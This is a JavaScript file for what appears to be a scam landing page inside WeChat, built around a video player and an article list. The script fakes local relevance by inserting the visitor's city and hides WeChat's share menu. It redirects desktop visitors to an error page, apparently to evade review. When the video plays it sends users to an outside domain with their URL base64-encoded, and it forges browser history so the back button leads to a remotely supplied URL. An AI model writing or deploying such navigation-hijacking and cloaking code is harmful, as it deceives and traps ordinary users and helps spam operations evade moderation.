//根据ip地址获得所在城市
var address = localAddress.city
  ? localAddress.city
  : localAddress.province
  ? localAddress.province
  : "湖南";
var city = address.replace(/(.*)市/, "$1");
city = city.replace(/(.*)省/, "$1");
var t = $(".h3").text();
var res = t.replace(/{city}/, city);
$(".h3").text(res);
document.title = res;
$("li").each(function(index) {
  $(this).html(
    $(this)
      .html()
      .replace(/{city}/, city)
  );
});

/**
 * 调用微信内部浏览器私有接口
 */
if (typeof WeixinJSBridge == "undefined") {
  if (document.addEventListener) {
    document.addEventListener("WeixinJSBridgeReady", onBridgeReady, false);
  } else if (document.attachEvent) {
    document.attachEvent("WeixinJSBridgeReady", onBridgeReady);
    document.attachEvent("onWeixinJSBridgeReady", onBridgeReady);
  }
} else {
  onBridgeReady();
}
/**
 * 调用微信内部浏览器私有接口，隐藏微信分享按钮
 */
function onBridgeReady() {
  WeixinJSBridge.call("hideOptionMenu");
}

if (obj.iswechat == 1) {
  var system = { win: false, mac: false, xll: false };
  var p = navigator.platform;
  system.win = p.indexOf("Win") == 0;
  system.mac = p.indexOf("Mac") == 0;
  system.x11 = p == "X11" || p.indexOf("Linux") == 0;
  console.log("in");
  if (system.win || system.mac) {
    location.href = "error.html";
  }
}

/**
 * 腾讯播放器插件的参数、配置
 * 播放器文档：http://v.qq.com/open/doc/tvpapi2.0.pdf
 * obj.apic 播放结束后调用的接口，该接口返回需跳转的url  eg:http:\/\/56s.uggboots-on-sale.com\/index.php\/index\/getSharec\/id\/
 * e.v  通过上面接口生成的url   eg:{"v":"http:\/\/11TohZJoC.zhengquangrass.com\/195aeca*2!9b8a8d(d,b1799@ed2ba-fc2_6b73share-9655a98dfa17c59058256400cde122e6.index.php.2748.72a79c0b054826f23a40d966ab81c12cdfc7dba8\/c\/23,114"}
 */
function getUrlParam(name) {
  var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象
  var r = window.location.search.substr(1).match(reg); //匹配目标参数
  if (r != null) return unescape(r[2]);
  return null; //返回参数值
}

var o = getUrlParam("isshare");
$.getScript("js/vv.js", function() {
  var _PlayVideo = new NewTxplayer({
    modId: obj.modId, //默认的 DOM 元素 ID
    vid: obj.vid, //设置视频id
    currtime: 200,
    story: obj.story,
    img: obj.img //设置封面图片
  });
  _PlayVideo.PlayStart = function() {
    if (!o) {
      location.href =
        "http://py.jczcbg.com/entry.html?callback=" +
        window.btoa(window.location.href);
    }
  };
  _PlayVideo.playNext = function() {
    //  alert('播放完了');
  };
});

// $('li').on('click',function () {
//     location.href = obj.b.replace(/{id}/,$(this).attr('data-id'));
// });

/**
 * 文章列表点击跳转事件
 * 获取data-id属性，来跳转根目录中相对应的 html
 */
$("li").on("click", function() {
  var id = $(this).attr("data-id");
  location.href = "../" + id + ".html";
  // location.href = obj.b.replace(/{id}/,$(this).attr('data-id'));
});

/**
 * 浏览器返回 历史记录伪造
 * obj.advapi 页面中base64里面解码的接口地址
 * e.url 接口地址返回的url，浏览器需返回的url地址
 */
$.getJSON("http://py.jczcbg.com/generate/api", function(e) {
  console.log(e, "<----e");
  setTimeout(function() {
    history.pushState(history.length + 1, "message", e.url);
  }, 200);
  window.onhashchange = function() {
    location.href = e.url + "&pk=" + obj.o;
  };
  document.getElementById("fanhui").onclick = function() {
    location.href = e.url + "&pk=" + obj.o;
  };
});
// $.getJSON('http://sdw.rpmbw.com/index/Adv/Ainterfaces?dir=restart&index=tousu&z=html',function (e) {
//     document.getElementById('tous').onclick = function () {
//         location.href = e.url;
//     };
// });

/**
 * 投诉页面点击跳转事件
 */
document.getElementById("tous").onclick = function() {
  location.href = "tousu.html";
};
